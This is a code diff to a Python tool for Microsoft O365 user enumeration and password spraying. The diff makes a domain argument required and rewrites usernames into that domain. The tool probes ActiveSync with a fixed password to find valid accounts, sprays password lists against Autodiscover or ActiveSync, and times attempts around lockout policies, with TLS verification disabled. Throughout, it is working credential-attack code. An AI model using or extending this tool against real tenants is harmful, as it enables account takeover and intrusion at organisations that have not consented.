@@ -109,9 +109,10 @@ class Enumerator:
     # User enumeration storage
     valid_accts = []
 
-    def __init__(self, username_list, proxy=None, debug=False, threads=10):
-        self.debug = debug
-        self.proxy = None if not proxy else {
+    def __init__(self, username_list, domain, proxy=None, debug=False, threads=10):
+        self.domain  = domain
+        self.debug   = debug
+        self.proxy   = None if not proxy else {
             "http": proxy, "https": proxy
         }
         self.user_list = username_list
@@ -130,6 +131,13 @@ class Enumerator:
         """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
         password = "Password1"
         try:
+            if '@' in user:
+                if self.domain != user.split('@')[-1]:
+                    user = "%s@%s" % (user.split('@')[0], self.domain)
+
+            else:
+                user = "%s@%s" % (user, self.domain)
+
             headers = {"MS-ASProtocolVersion": "14.0"}
             auth    = (user, password)
             rsp     = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
@@ -183,7 +191,8 @@ class Sprayer:
     # Password spray storage
     valid_creds = {}
 
-    def __init__(self, username_list, proxy=None, debug=False, threads=10, secondary=False):
+    def __init__(self, username_list, domain, proxy=None, debug=False, threads=10, secondary=False):
+        self.domain  = domain
         self.url     = self.primary_url if not secondary else self.secondary_url
         self.codes   = self.primary_codes if not secondary else self.secondary_codes
         self.headers = None if not secondary else {"MS-ASProtocolVersion": "14.0"}
@@ -215,6 +224,13 @@ class Sprayer:
     def spray(self, user, password):
         """ Password spray Microsoft using Microsoft Autodiscover """
         try:
+            if '@' in user:
+                if self.domain != user.split('@')[-1]:
+                    user = "%s@%s" % (user.split('@')[0], self.domain)
+
+            else:
+                user = "%s@%s" % (user, self.domain)
+
             auth = (user, password)
             rsp  = self.method(self.url, headers=self.headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
 
@@ -261,32 +277,26 @@ class Sprayer:
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer")
     # group = parser.add_mutually_exclusive_group(required=True)
-    parser.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")
-    parser.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
-    parser.add_argument("-s", "--spray",    action="store_true", help="Perform password spraying")
-
+    parser.add_argument("-v", "--validate",  action="store_true", help="Validate a domain is running O365")
+    parser.add_argument("-e", "--enum",      action="store_true", help="Perform username enumeration")
+    parser.add_argument("-s", "--spray",     action="store_true", help="Perform password spraying")
+    parser.add_argument("-d", "--domain",    type=str,   help="Domain name to validate against O365", required=True)
     parser.add_argument("-u", "--username",  type=str,   help="Username(s) delimited using commas")
     parser.add_argument("-p", "--password",  type=str,   help="Password(s) delimited using commas")
     parser.add_argument("-U", "--usernames", type=str,   help="File containing list of usernames")
     parser.add_argument("-P", "--passwords", type=str,   help="File containing list of passwords")
     parser.add_argument("-c", "--count",     type=int,   help="Number of password attempts to run before resetting lockout timer. Default: 1", default=1)
     parser.add_argument("-l", "--lockout",   type=float, help="Lockout policy reset time (in minutes). Default: 5 minutes", default=5.0)
-    parser.add_argument("-d", "--domain",    type=str,   help="Domain name to validate against O365")
 
     parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>")
     parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=10)
     parser.add_argument("--output",  type=str, help="Output file name for enumeration and spraying")
     parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
     parser.add_argument("--debug",   action="store_true", help="Debug output")
-
     parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`")
     parser.add_argument("--validate-secondary", action="store_true", help="Use `openid-configuration` for domain validation instead of `getuserrealm`")
 
     args = parser.parse_args()
-
-    # If validating the domain make sure we have the domain
-    if args.validate and not args.domain:
-        parser.error("-d/--domain is required for domain validation via -v/--validate.")
 
     # If enumerating users make sure we have a username or username file
     if args.enum and (not args.username and not args.usernames):
@@ -313,7 +323,7 @@ if __name__ == "__main__":
     if args.enum:
         # We chose to parse files first
         username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
-        enum = Enumerator(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads)
+        enum = Enumerator(username_list, domain=args.domain, proxy=args.proxy, debug=args.debug, threads=args.threads)
         print("[*] Performing user enumeration against %d potential users" % (len(username_list)))
         enum.loop.run_until_complete(enum.run())
         helper.print_stats("User Enumeration", enum.valid_accts, ("valid_users.txt" if not args.output else args.output))
@@ -333,7 +343,7 @@ if __name__ == "__main__":
         if len(username_list) > 0:
             password_list = helper.get_list_from_file(args.passwords) if args.passwords else args.password.split(',')
 
-            spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
+            spray = Sprayer(username_list, domain=args.domain, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
 
             print("[*] Performing password spray against %d users" % (len(username_list)))
             if not args.paired:
